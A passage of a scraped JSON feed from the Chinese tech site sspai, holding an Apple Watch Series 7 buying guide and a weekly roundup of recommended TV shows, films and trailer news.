src=\"https://cdn.sspai.com/2021/10/08/7b655571952e53e1575da72485286dd2.jpg\"><figcaption>午夜色、星光色、绿色、新款蓝色和红色</figcaption></figure><p>从材质上看，铝金属表壳观感呈现哑光质感，并且不易产生划痕；不锈钢表壳经过抛光打磨，质感更加出色，缺点也较明显，容易产生划痕；钛金属表壳的光亮程度介于铝金属与不锈钢之间，表面呈现材质特有的拉丝质感，得益于材料特性，适合存在金属过敏症状的用户选择。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/288907bc409bd323d60c959eab175f58.jpg\"><figcaption>银色、石墨色、金色</figcaption></figure><p>由于 Apple Watch Series 7 的产品页面暂未公布相关详细规格参数，对于不同型号表款的具体重量，暂时无法得知。通过旧款 Apple Watch 的相关参数可以发现，铝金属表壳版本的表款重量最轻，其次是钛金属版本，最重的是不锈钢版本。对于重量敏感的用户，可以据此作为选购 Apple Watch Series 7 的相关参考。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com//2020/09/19/ead2e59e0e64f69a4f1321f4197bdc96.png\"><figcaption>旧款 Apple Watch 表款重量对比</figcaption></figure><h2>尺寸与显示屏</h2>\n<p>Apple Watch Series 7 提供了 41mm 和 45mm 二种尺寸版本可供选择，尺寸越大，屏幕显示面积也就越大。</p>\n<p>Apple Watch Series 7 的一大升级，就是屏幕的显示区域更大、边框更窄。根据官网给出的信息，Apple Watch Series 7 较于前代产品的屏幕显示面积增加了 20%，边框收窄了 40%。同样，由于官网暂未公布 Apple Watch Series 7 的规格参数，我们只能通过官网公布的图片对于表壳尺寸进行粗略对比，可以看到，Apple Watch Series 7 与 Apple Watch Series 6 的表壳宽度基本一致，高度可能略高于后者，但也几乎可以忽略不计。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/10f536c35e685c267e5c3c126769b1c6.png\"></figure><p>显示屏幕和尺寸双双变大，旧款 Apple Watch 用户也不用担心，根据目前 Apple 官网在售的新款 Apple Watch 表带提供的信息来看，能够做到对于新款表款在内大部份 Apple Watch 的兼容。因此，你的旧表带，同样可以用在 Apple Watch Series 7 上。</p>\n<p>对于之前选择 44mm 版本表壳的用户，由于 Apple Watch Series 7 的显示面积增加，考虑到 41mm 版本相较 45mm 版本售价更低，对于手表的屏幕大小没那么高的用户今年可以考虑尺寸更小的版本了。</p>\n<p>Apple Watch Series 6 与 Apple Watch SE 具有相同的表壳尺寸，大的 44mm，小的 40 毫米。Apple Watch Series 3 则有 42mm 和 38mm 可选，准备购入旧款手表的用户，根据自己对于屏幕大小、预算等方面的需求，按需选购即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/217f71ee36f8310d72603507b003e327.png\"><figcaption>目前在售的 3 款旧款型号的对比</figcaption></figure><p>值得注意的是，Apple Watch Series 7 的表镜相较前代产品增加了 50% 的厚度，由于缺少参数信息，表壳的厚度目前也不得而知，可能要等晚上订购开启之后，我们才能获得包括新款手表厚度在内的详细信息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/aebbb4bf3e20b7614f453b0076966cf8.png\"></figure><p>对了，Apple Watch Series 7 不仅有了更加坚固抗裂的表镜，也首次支持了 IP6X 防尘性能认证，防水深度与前代一致同样达到了 50 米。如果你经常佩戴 Apple Watch 进行各类户外运动，那么这代产品将会更耐用、更好用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/ca3268a6c8c0b0ee917a7fd633d0be87.png\"></figure><p>Apple Watch Series 7 继续采用了全天候视网膜屏，根据官网介绍，屏幕在室内时的显示亮度相较前代产品有多达 70% 的提升。</p>\n<h2>功能</h2>\n<p>与前几代产品不同，Apple Watch Series 7 没有在硬件方面增加针对运动健康相关的新功能，通过 watchOS 8 获得的功能升级与更新也基本都向旧款产品进行了开放，比如新的睡眠 App、正念 App 等。</p>\n<p>独占功能方面，新款 Apple Watch 仍依照惯例提供了专属表盘，分别是「轮廓表盘」和「双模块表盘」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/2aa2bab472e7b11afac2279d87785e0b.jpg\"><figcaption>轮廓表盘</figcaption></figure><p>可以看到，新的表盘也是针对新的屏幕设计进行优化。其中，「轮廓表盘」能够发挥曲屏优势，呈现更好的时标显示效果；「双模块表盘」则能利用更大的显示面积，更加直观地展示表盘上的信息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/e6519828f25e727b7961b2dd3f2fd940.jpg\"><figcaption>双模块表盘</figcaption></figure><p>当然，Apple Watch Nike 与 Apple Watch Hermès 系列也推出了各自版本独家专享的新表带与表盘。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/c9d388b8ad9143efeddef5ba795ff507.png\"><figcaption>Apple Watch Nike 与 Apple Watch Hermès 系列</figcaption></figure><p>随大屏而来的，自然还有更大的操作空间。Apple Watch Series 7 首次将 QWERTY 全键盘输入法带到了手表上，计算器等 App 也有了更加复杂的键位设计，可以实现更多功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/37d9989e623f028270e0b6a25a9d1a41.png\"></figure><p>因此，如果你更加看重 Apple Watch 的运动和健康功能，Apple Watch Series 6 就已经够用了，没有必要升级 Apple Watch Series 7。</p>\n<p>除了软件方面的升级，「超快速充电」也是今年 Apple Watch 上不得不提的一项新功能。搭配 USB-C 充电线，Apple Watch Series 7 的充电速度相较前代产品提高了 33%，只需充电 8 分钟，就能实现长达 8 小时的睡眠佩戴监测。</p>\n<p>需要注意的是，Apple Watch Series 7 的快速充电功能需要配合 USB-C 充电线才能实现，使用 USB-A 充电线只能实现与前代相同的「慢速」充电。此外，目前 Apple 官网在售、支持给 Apple Watch 充电的 MagSafe Duo Charger，也无法在新表上实现快速充电功能。当然，由于硬件上没有支持，使用 USB-C 充电线为旧款手表充电，无法实现快速充电。</p>\n<p>续航方面，根据目前给出的信息来看，Apple Watch Series 7 的全天续航时长为 18 小时，与 Apple Watch Series 6 保持了一致，没有任何提升。</p>\n<h2>选购建议</h2>\n<p>最后来说说选购建议。</p>\n<p>购买 Apple Watch，主要无非有这 2 种需求：</p>\n<ul>\n<li>想买一块戴着还行的手表。</li>\n<li>经常运动，重视身体健康。</li>\n</ul>\n<p>当然，能接收 iPhone 通知、进行一些简单的 App 操作，想必也是不少用户看重的功能。从「选块好看的表」的角度考虑，很明显目前官方仍然在售的 Apple Watch Series 3 不是一个好的选择，它仍然停留在「上一代设计」，功能相比 Apple Watch SE 都有不少缺失，尤其是紧急呼叫、摔倒监测、噪声监测这样重要的功能；以推出时间来看，它的生命周期也会更短，也许在不远的将来，这款 2017 年推出的产品，就会失去对于新的 watchOS 系统的支持。</p>\n<p>如果你预算有限又没那么有限，Apple Watch SE 就是不错的选择。更加现代化的圆角表壳设计，支持大部分你平时能用得上的健康功能，比如心率监测报警、紧急呼叫、摔倒监测等等；价格也相对合理，买一块能用上好几年。</p>\n<p>如果你已经决定入手最新款的 Apple Watch Series 7，选择哪款更重要的决定因素，毫无疑问依然是预算。如果从使用场景上来看，铝金属版本更加轻盈，也更加耐用——比如不易产生划痕，价格还更低，是更适合运动爱好者的选择。</p>\n<p>如果你在健康功能之外同样很看重这块手表戴在你手上的质感与搭配程度，不锈钢版本不论是表壳的质感、光亮程度还是价格，都处在更好也更加「平衡」的区间，不过也需要提醒一句，由于不锈钢材质本身的特性，用久了之后划痕在所难免，不怕麻烦的话也可以自己选购合适的抛光工具进行处理，介意划痕的话还是慎重选择。至于 Apple Watch Edition 和 Hermès 版本，会选择它们相信你也不仅是预算充足，对于品牌也有一定追求，该不该选自然也就不用多说了。</p>\n<p>至于选 GPS 还是 GPS + 蜂窝版本这个一直没有结论的话题，还是那句话，这是一项大部分人在大部分情况下都用不到的功能，但是一旦用上说不定能帮上大忙。我的建议是大部分人直接选择 GPS 版本即可，如果你很明确地知道自己需要蜂窝数据功能，那么也不必多说。当然，选择 GPS + 蜂窝版本，除了多花钱，肯定也不会出错，真要选的话不如当作是买了一份小额保险，也希望你永远都用不上这份「保险」。</p>\n<p>Apple Watch Series 7 即将开售，今晚你买不买？不妨在评论区和我们分享你的决定，以及对于 Apple Watch 的看法。</p>\n<p><strong>推荐阅读</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/56980\" target=\"_blank\">一派 | 刚买了新 Apple Watch 的四位编辑，谈了谈他们的使用体验</a></li>\n<li><a href=\"https://sspai.com/post/68748\" target=\"_blank\">watchOS 8 正式版来了，这些新功能值得尝鲜</a></li>\n</ul>\n<p>&gt; 关于 iPhone 13 的一切，都在 <a href=\"https://sspai.com/topic/362\" target=\"_blank\">这里</a> 了 📱</p>\n<p>&gt; 这些升级之后不能错过的功能与技巧，让你 <a href=\"https://sspai.com/topic/363\" target=\"_blank\">玩转 iOS 15</a> 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69142"},{"title":"本周看什么丨最近值得一看的 8 部作品","date":"2021-10-08 09:01:13","description":"\n<h2>☕️ TL;DR</h2>\n<ul>\n<li>近期佳作推荐：[美剧] 婚姻生活、[电影] 援助、[动画] 古见同学有交流障碍症。、[综艺] 屋檐之夏、[美剧] 女佣、🔦 [电影] 犬之力、[电影] 酷爱电影的庞波小姐、[丹麦剧] 寒栗</li>\n<li>几则精彩预告：好莱坞科幻片《沙丘》发布终极预告，10 月 22 日中国内地上映、动画剧集《银翼杀手：黑莲花》11 月 13 日上线、《权力的游戏》衍生剧集《龙之家族》2022 年上线、《生化危机：欢迎来到浣熊市》公布预告，11 月 24 日北美上映</li>\n<li>几则影视资讯：Apple TV+ 正式续订《基地》第二季、英剧《浴血黑帮》将制作电影版、台剧《华灯初上》11 月 26 日上线 Netflix、西蒙·金伯格执导电影《355》发布全新海报和预告，2022 年 1 月 7 日北美上映</li>\n<li>🎬 <strong>秋日特辑：</strong><a href=\"https://sspai.com/post/69093\" target=\"_blank\"><strong>这 10 部电影，让你不再错过秋天的短暂赏味期</strong></a> 🍁</li>\n</ul>\n<h2>👀 N 部作品推荐</h2>\n<p>根据读者反馈，如果推荐语涉及剧透（对故事核心、暗线、伏笔、结局等关键要素的透露），我们会在对应作品的标题前增加 🔦 的 Emoji。</p>\n<p>如有其他建议也欢迎在评论区提出，感谢大家对「看什么」栏目的喜爱和支持。</p>\n<h3>[美剧] 婚姻生活</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/0ed45f5b6d5eb0c542825097828e3efd.png\"></figure><p>关键词：剧情</p>\n<p>片长：60 分钟（单集）× 5 集；<a href=\"https://movie.douban.com/subject/35136700/\" target=\"_blank\">豆瓣链接</a></p>\n<blockquote><p>我不喜欢你了，要怎么补救？</p></blockquote>\n<p>@宇宙浪费指南 ：如果说斯嘉丽的《婚姻故事》中那段争吵名场面带给人的是扑面而来的压迫感，让人代入感极强、忍不住想逃，那么这部《婚姻生活》则是漫不经心的带人走入并感受他们的婚姻，再一点点令人窒息。</p>\n<p>这部剧改编自 Ingmar Bergman1973 年的瑞典迷你剧，故事聚焦一对当代美国夫妇，重新审视爱情、憎恨、欲望、一夫一妻制、婚姻及离婚等议题。</p>\n<p>我不想过多地赞美演员的演技，能自然地把人带到这场婚姻里，大段的对白、克制和爆发的情绪都证明了这一点。Oscar Issac 饰演的丈夫从最初得知消息后的难以置信、到卑微地挽回、失控的发泄、失望的愤恨，以及最后绝望的冷漠，把对这段婚姻的破碎和内心的重建演绎得淋漓尽致。</p>\n<p>剧中大段的对白，反复讨论的都是一个主题——婚姻究竟如何经营？第一集中，男女主的朋友是一对选择开放式关系的夫妻，或许这是他们对自己的婚姻交出的答卷，或许认为这种方式能让他们比平均八年的美国婚姻时长更持久，而男主与朋友的对话或是在隐隐点题：人究竟是要征服欲望还是屈服欲望？这让我想到了杨蒙恩在《吐槽大会》上的求婚，他说「没有天生的好人，只有被约束的文明者」，或许是对婚姻的理解和这个问题的回答吧。</p>\n<h3>[电影] 援助</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/56c50f5c80aad4bc59aa72ee9e46dd54.png\"></figure><p>关键词：剧情</p>\n<p>片长：98 分钟；<a href=\"https://movie.douban.com/subject/35259282/\" target=\"_blank\">豆瓣链接</a></p>\n<blockquote><p>「劳模」又有新电影了！</p></blockquote>\n<p>@宇宙浪费指南 ：因《杀死伊芙》而被中国观众熟知的「小变态」朱迪·科默，前段时间刚出现在大荧幕上，饰演《失控玩家》里的女主，没多久又一部电影播出了。</p>\n<p>这部由英国公共电视台 Channel 4 出品的电影聚焦第一波新冠疫情中受到极大冲击的英国护理中心，围绕护理院一位早发型阿尔茨海默病患者 Tony（斯蒂芬·格拉汉姆扮演）和新护工 Sarah（朱迪·科默）的故事展开，以普通人的视角和命运来反映英国官方在疫情爆发初期的无能。</p>\n<p>Sarah 很聪明，但在学习和工作中一直都不合群，她来到护理院之后，却意外地在这里找到了使命和价值。她十分善于和护理中心的居住者沟通，尤其是 47 岁的 Tony ，但当疫情来临，这一切都在顷刻间崩塌……</p>\n<p>朱迪·科默贡献出了有史以来最动人的演技，中间 20 分钟左右的长镜头来回地跟拍，摇晃的镜头、怼脸拍的特写和急促的呼吸看得人窒息，坐在车里崩溃的一段戏爆发力极强，对着镜头不停诘问，声嘶力竭地喊出「No one’s coming」的时候，实在太令人痛心了。这部电影，或许诠释的就是「时代的一粒灰，落在个人头上，就是一座山」这句话吧。</p>\n<h3>[动画] 古见同学有交流障碍症。</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/article/4fbb26275457103eb5a9c682d8f9a344\"></figure><p>关键词：漫画改 / 校园 / 恋爱 / 搞笑</p>\n<p>片长：24 分钟（单集）× 具体集数未知，每周三更新</p>\n<p>观看渠道：<a href=\"https://www.netflix.com/title/81228573\" target=\"_blank\">Netflix</a>；<a href=\"https://movie.douban.com/subject/34982453/\" target=\"_blank\">豆瓣链接</a></p>\n<p>读原作：<a href=\"https://manga.bilibili.com/detail/mc26468\" target=\"_blank\">哔哩哔哩漫画</a></p>\n<blockquote><p>蛐蛐只野是读心能力者。</p></blockquote>\n<p>@SHY：古见硝子是美少女，品学兼优，出尘脱俗，去神社会被人参拜，走三步就有人告白，却有交流障碍症，连完整的句子都无法当面说出。古见同学渴望与人正常沟通，愿望是交到 100 个朋友，但一直无人理解，只能暗自纠结。直到高中入学第一天，古见同学遇到了过于普通的同桌只野仁人，后者察觉到她的隐情，自告奋勇成为其第一个朋友，并决心帮她实现梦想——但是，只野同学还没有发现，这里是名门·私立伊旦高中，录取学生的标准并非成绩，而是「个性」。长名驯染是发小，山井恋是病娇，中中思春是中二病……在怪人云集的这所学校，古见同学想交到朋友，可没有那么简单。</p>\n<p>《古见同学有交流障碍症。》前期是近几年最有趣的校园漫画之一，改编成动画却必须费一番苦心：每话只占几页篇幅，之间往往没有联系，该如何编排叙事，做到无缝衔接；古见同学几乎没有台词，要怎样展现其魅力，刻画内心独白，又不违背人设；原作大量使用的拟声词等表现手法，依托于漫画体裁，全盘照搬有碍观感，另起炉灶更考验水平。「古见同学不会动画化」这梗固然有小学馆不上心和粉丝调侃成分，却也一定程度上道出了其艰辛。</p>\n<p>坦白说，我从未想到《古见同学有交流障碍症。》的动画质量会这么高，已播出的第一集作画、演出、音乐全方位拔尖，几乎挑不出瑕疵。导演川越一生继承漫画表现方式的同时，活用别致而有趣的演出，为略无聊的黑板交流赋予了文艺气质，煽情与搞笑均恰到好处。矢岛哲生负责的 <a href=\"https://www.youtube.com/watch?v=pRFgMtHtvYY\" target=\"_blank\">OP 动画</a> 令人印象深刻，桥本由香利的音乐也增色不少，达到了一加一大于二的效果。只靠充足的经费和工期，远不足以做到这一步，还需要制作组对作品倾注的爱。只要保持目前的节奏，年度最佳恋爱喜剧非它莫属。</p>\n<h3>[综艺] 屋檐之夏</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/article/77b3933a5d100aff2bd268ab6cf71e54\"></figure><p>关键词：真人秀</p>\n<p>片长：60 分钟（单集，具体集数未知）</p>\n<p>观看渠道：<a href=\"https://www.bilibili.com/bangumi/play/ep423456\" target=\"_blank\">哔哩哔哩</a>；<a href=\"https://movie.douban.com/subject/35518766/\" target=\"_blank\">豆瓣链接</a></p>\n<blockquote><p>屋檐之下，欢迎回家。</p></blockquote>\n<p>@潘誉晗：这部由 B 站出品，在中国老龄协会指导下拍摄的综艺记录了上海 3 位独居老人和沪漂年轻人一起居住 21 天的生活。他们的相处是变成灾难，还是因为不一样的火花而变成无话不谈的忘年之交？真是令人好奇。</p>\n<p>一部很好笑也很好哭的综艺。原来再坚强的人成了独居老人之后，也会有令人心酸之处，而那些看上去接受新事物很快的年轻人，在面对生活阅历丰富的老年人时，也会有尴尬的事情发生。文化的交流和年龄的代沟，这一刻碰撞在一起，在令人在发笑的同时，也被温暖着、反思着。近几年国内的观察类真人秀节目层出不穷，在如今这个老龄化时代出现这样一档综艺，的确很「有必要」。社会老龄化已经是一个不可避免的问题，人类因长寿而带来的独居生活也一定不会是太遥远的话题，由于老人独居所发生的悲剧屡见不鲜，所以通过这样一档节目让更多的人关注到这个问题，个人觉得真的很棒。</p>\n<h3>[美剧] 女佣</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/a0379840676327e40de75ec92b75dd51.png\"></figure><p>关键词：剧情 / 喜剧</p>\n<p>片长：60 分钟（单集）× 10 集；<a href=\"https://movie.douban.com/subject/34925417/\" target=\"_blank\">豆瓣链接</a></p>\n<blockquote><p>回去的比不回去的多，平均次数是 7 次。</p></blockquote>\n<p>@宇宙浪费指南 ：看剧时被不时闪过的弹幕提醒到，越想越觉得女主的生活（单亲妈妈亚历克斯）像极了《无耻家庭》里菲奥娜可能会展开的生活方向，于是去查了导演，果然是《无耻家庭》的导演约翰·威尔斯，我也不自觉在看的时候，把亚历克斯想象成平行时空的菲奥娜，她有着糟糕的父母，有一个酒鬼且家暴的丈夫，同时，她还拥有一个可爱的孩子。</p>\n<p>《女佣》改编自斯蒂芬妮·兰德的《纽约时报》畅销回忆录《Maid: Hard Work, Low Pay, and a Mother’s Will to Survive》，它描述了一个单亲妈妈的生活——靠当女佣来艰难地维持生计，同时努力摆脱受虐关系和流离失所的状态，以便为女儿麦蒂创造更好的生活。</p>\n<p>这部剧对女性的艰辛处境没有丝毫的遮掩，当一个女人遭遇家庭暴力、精神暴力，她失去自由、没有工作、没有住处、被剥夺抚养孩子的权利……难以想象身处其中，经历一连串的打击时，她究竟有多绝望。但她是个母亲，为了孩子，她一直在抗争、在努力，对待孩子始终温柔，无论历经多少次打击、多少次走到山穷水尽的绝望尽头，她都没有崩溃，勇敢地挣脱了一切枷锁和束缚，离开了这个环境，带女儿获得了自由。剧中讨论的话题颇为沉重，丝毫不理解为什么奈飞打上了「喜剧」的标签，但不得不说，剧情细腻动人，没有一味的脸谱化任何人，孩子爸爸的最后的 「You should have full custody for our baby」让这个人物立体了起来。</p>\n<p>这部剧大概会提名明年的艾美奖吧。</p>\n<h3>🔦 [电影] 犬之力</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/article/74857f850edc9e260de6421e34391bdb\"></figure><p>关键词：剧情 / 同性 / 西部</p>\n<p>片长：127 分钟（单集）；<a href=\"https://movie.douban.com/subject/33437152/\" target=\"_blank\">豆瓣链接</a></p>\n<blockquote><p>情潮暗涌，他只是一个想要爱的男人罢了。</p></blockquote>\n<p>@潘誉晗：本尼饰演的菲尔和弟弟一起经营着一家牧场，他粗鲁、邋遢，但有着极强的控制欲，所以当弟弟带着新婚妻子和她的儿子彼特一起走进他的生活时，菲尔不但不喜欢这个弟媳，更看不惯彼特的性格。可当菲尔发现彼特也可以看到隐藏在山中的犬吠之形时，他对彼特的态度，也悄然发生了变化。</p>\n<p>把剧情看成叔侄恋真的是对影片最大的误解，作为一位女性导演，坎皮恩为我们展现的这份情感其实很克制，更多的是在西部牛仔的世界中，不同力量地互相制衡和抗争。无论是看似暴戾的菲尔心中藏着的那份柔软，还是看似柔弱的彼特可以面不改色地解剖一只兔子，都暗含深意，尤其是性格差异与最后剧情造成的反转真的令人拍案叫绝。最后叔侄谷仓的对手戏也特别精彩，两个人眼神的交换和昏黄的暧昧，在烟雾下更为撩人。观看前半部分可能需要一点耐心，但当后半部分本尼把那份克制和隐忍的情绪都展现出来的时候，真的被他的演技所折服。今年威尼斯电影节银狮奖最佳导演果然名不虚传。</p>\n<h3>[电影] 酷爱电影的庞波小姐</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/article/63e453a573566f21258bbb6be6b878d0\"></figure><p>关键词：漫画改 / 剧情 / 艺术 / 励志</p>\n<p>片长：94 分钟</p>\n<p>观看渠道：<a href=\"https://video.unext.jp/play/SID0061804/ED00336524\" target=\"_blank\">U-NEXT</a>；<a href=\"https://movie.douban.com/subject/30037194/\" target=\"_blank\">豆瓣链接</a></p>\n<p>读原作：<a href=\"https://book.douban.com/subject/35308375/\" target=\"_blank\">台湾角川</a></p>\n<blockquote><p>去拍电影或者去死，我只有这两条路可选。</p></blockquote>\n<p>@SHY：《酷爱电影的庞波小姐》是一部关于拍摄电影的电影，在电影圣地喵莱坞，干练的天才制片人庞波小姐拥有电影人所需的一切人脉与才华，穿梭于各个片场，拍的却尽是 B 级片。担任其助手的青年吉恩虽然对此颇有疑问，却忠实于本职工作，并用心记下片场的点滴细节，憧憬着能独立拍摄电影的那天。某日，吉恩拿到了庞波小姐亲手策划的最新剧本《MEISTER》，男主角是阔别影坛十年的传说影星，女主角是刚刚出道的新人，而被指名为导演的竟然是吉恩自己。为了拍出庞波小姐所说的「名作」，满怀着不安和期待，吉恩与剧组来到瑞士，波澜万丈的现场摄影即将开始。</p>\n<p>用电影诠释电影，《酷爱电影的庞波小姐》最突出的亮点是极富想象力的镜头剪辑与转场方式，特别是主角团集结前，以跳脱却不凌乱的闪回串起每个人交错的生活轨迹，一气呵成，分外畅快。电影的画幅随叙事变化，提到的知识点往往会立即运用，达成在电影里看电影的奇妙观感。这种氛围若能贯彻如一，本作无疑会是一部杰作，后半部分突兀的原创剧情却完全毁掉了前半的精巧构思。都合的融资桥段不仅缺乏逻辑，更否定了原著中洋溢的理想主义精神，将故事矮化为廉价的工业鸡汤。全篇都在大谈特谈控制时长的重要性，却为了凑足院线一个半小时而迷失方向，着实有些讽刺。但总体来说，这仍是一部娱乐性满载的良作，即使只为了欣赏演出也值得抽出时间观看。</p>\n<h3>[丹麦剧] 寒栗</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/7e474f9b640d534315fb8eacb00c8cfc.png\"></figure><p>关键词：悬疑 / 惊悚 / 犯罪</p>\n<p>片长：60 分钟（单集）× 6 集</p>\n<p>观看渠道：<a href=\"https://www.netflix.com/tw/title/81039388?s=i&amp;trkid=13747225&amp;vlang=zh&amp;clip=81465058\" target=\"_blank\">Netflix</a>；<a href=\"https://movie.douban.com/subject/34800967/\" target=\"_blank\">豆瓣链接</a></p>\n<blockquote><p>如果你看见了一个栗子人，那是因为你早就已经被盯上了。</p></blockquote>\n<p>@潘誉晗：哥本哈根最近很不太平，几起连环女性杀人事件的唯一线索是案发现场都留下了一个栗子人，而上面留下的指纹，竟来自女政治家罗莎一年前已经失踪的女儿。于是，女警官图林和调来的男搭档马克，要做的不仅仅是面对未知的凶手亟待破案那么简单了，本以为死去的政客女儿是否还活着也是他们需要寻找的真相。</p>\n<p>一部非常适合秋季观看的悬疑剧，尤其是片头呈现出的大片的秋色，配合着剧中的重要工具栗子人的出现，增添了不少肃杀的诡谲感。前三集营造的氛围非常好，隐藏在暗处的凶手、凶手视角下的被害人都是猎物。本是被孩子们当作玩具的栗子人不合时宜地出现在被肢解的尸体旁，异常诡异，而死者都是不负责任的母亲的角色设定，也拓宽了剧集的深度。比起几部大热剧，这算是近期较为冷门的新剧了，整体风格的塑造也维持了北欧刑侦剧一贯的冷静自持，值得一看。</p>\n<h3>更多</h3>\n<p><a href=\"https://movie.douban.com/subject/35584692/\" target=\"_blank\">[英剧] 霍林顿大道</a> @潘誉晗：因为是被伤害所生下的孩子，所以担心遗传到生父暴力的特丽莎在发现儿子可能造成他人失踪后内心变得更加不安了，于是，她和自己的姐姐开始调查事情的真相。涉及的儿童失踪案件本身不算复杂，不过在几条支线的衬托下剧情就显得饱满了起来，女演员们的演技很好，很容易就被代入了剧情。</p>\n<p><a href=\"https://movie.douban.com/subject/35460234/\" target=\"_blank\">[日剧] 所罗门的伪证</a> @潘誉晗：宫部美雪的经典之作再次被改编成了日剧，这次 WOWOW 台的脚本把初中的设定直接改成了高中，聚焦校园暴力下死亡孩子的真相，到底是自杀，还是如举报信所说是被人杀害？需要调查才能找到答案。剧集整体的打光偏冷色调，配合剧情观看还是很有氛围感的。</p>\n<h2>📅 本周新预告</h2>\n<h3>好莱坞科幻片《沙丘》发布终极预告，10 月 22 日中国内地上映</h3> <p>10 月 8 日，由《降临》《银翼杀手 2049》导演丹尼斯·维伦纽瓦执导的科幻片《沙丘》发布终极预告。该片由提莫西·查拉梅、丽贝卡·弗格森、张震、乔什·布洛林、奥斯卡·伊萨克、哈维尔·巴登、赞达亚、杰森·莫玛、戴夫·巴蒂斯塔等群星出演，将于 10 月 22 日中国内地上映。</p>\n<h3>动画剧集《银翼杀手：黑莲花》11 月 13 日上线</h3> <p>10 月 8 日，Adult Swim 与 Crunchyroll 联合出品的原创动画剧集《银翼杀手：黑莲花》公布了正式预告，第一季共 13 集，11 月 13 日上线。本作由神山健治、荒牧伸志执导，渡边信一郎创意制片，Sola Digital Arts 制作，设定在《银翼杀手：2022 黑暗浩劫》后，讲述女性复制人 Elle 的冒险，《银翼杀手》正作角色也将登场。 <a href=\"https://www.youtube.com/watch?v=eUu3lK_Z8VM\">来源</a> </p>\n<h3>《权力的游戏》衍生剧集《龙之家族》2022 年上线</h3> <p>10 月 5 日，《权力的游戏》衍生前传剧集《龙之家族》公布了首支先导预告，第一季共 10 集，将于 2022 年登陆 HBO Max。本作改编自乔治·R·R·马丁的小说《血与火》，米格尔·萨普什尼克执导，莱恩·康道尔编剧，艾玛·达西、马特·史密斯、帕迪·康斯戴恩、奥利维亚·库克等主演，聚焦坦格利安家族的内部纷争「血龙狂舞」。 <a href=\"https://twitter.com/HouseofDragon/status/1445373212079140864\">来源</a> </p>\n<h3>《生化危机：欢迎来到浣熊市》公布预告，11 月 24 日北美上映</h3> <p>10 月 7 日，索尼影业公布了《生化危机》系列重启电影《生化危机：欢迎来到浣熊市》的首支正式预告，将于 11 月 24 日登陆北美院线。本作由约翰内斯·罗伯茨执导，罗比·阿美尔、卡雅·斯考达里奥、阿万·乔贾、汉娜·乔恩-卡门等主演，讲述克里斯、克莱尔、里昂、吉尔等主角初次踏入被丧尸危机笼罩的浣熊市时发生的故事。 <a href=\"https://www.youtube.com/watch?v=4q6UGCyHZCI\">来源</a> </p>\n<h3>更多</h3>\n<p><strong>《</strong><a href=\"https://www.bilibili.com/video/BV1Rq4y1R7PD\" target=\"_blank\"><strong>名侦探柯南 零的日常》《犯人犯泽先生》将改编为动画</strong></a><strong>：</strong>10 月 4 日，作为青山刚昌的漫画《名侦探柯南》第 100 卷发售纪念活动之一，两部衍生漫画《零的日常》和《犯人犯泽先生》宣布将改编为动画。前者由新井隆广创作，讲述拥有公安、侦探、黑衣组织成员三张面孔的男人安室透不为人知的日常；后者由神庭麻由子创作，讲述未来某起案件的真凶犯泽先生在世界犯罪都市米花镇的艰辛求生之路。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1wf4y1c7t3\" target=\"_blank\"><strong>安德鲁·加菲尔德主演新片《倒数时刻》11 月 19 日上线 Netflix</strong></a><strong>：</strong>10 月 4 日，由林-曼努尔·米兰达执导，安德鲁·加菲尔德主演的电影《倒数时刻》发布全新预告。影片改编自《吉屋出租》作者乔纳森·拉森的同名自传式音乐剧，讲述一位年轻但野心勃勃的音乐剧作曲家的故事，将于 11 月 19 日上线 Netflix。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1uq4y1N7Bp\" target=\"_blank\"><strong>林嘉欣主演电影《美国女孩》发布先导预告</strong></a><strong>：</strong>10 月 5 日，由阮凤仪执导，林嘉欣、方郁婷主演的的电影《美国女孩》发布先导预告。该片是导演阮凤仪的首部剧情长片，创作灵感源自其本人的真实故事，已提名包括最佳剧情片、最佳新导演、最佳女主角在内的 7 项金马奖。</p>\n<p><a href=\"https://www.bilibili.com/video/BV14f4y177jU\" target=\"_blank\"><strong>科林·费斯新片《绞肉行动》发布新预告</strong></a><strong>：</strong>10 月 5 日，科林·费斯主演二战题材新片《绞肉行动》发布新预告。影片改编自真实历史事件，由约翰·马登执导，凯莉·麦克唐纳、马修·麦克菲迪恩、佩内洛普·威尔顿、詹森·艾萨克、约翰尼·弗林、西蒙·拉塞尔·比尔等出演，将于 2022 年 1 月 7 日英国上映。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1pv411g7Cy\" target=\"_blank\"><strong>《亿万》第六季 2022 年 1 月 23 日开播</strong></a><strong>：</strong>10 月 4 日，《亿万》第六季首曝预告，保罗·吉亚玛提、寇瑞·斯托尔、玛姬·丝弗等继续主演。第六季共 12 集，将于 2022 年 1 月 23 日开播。</p>\n<p><a 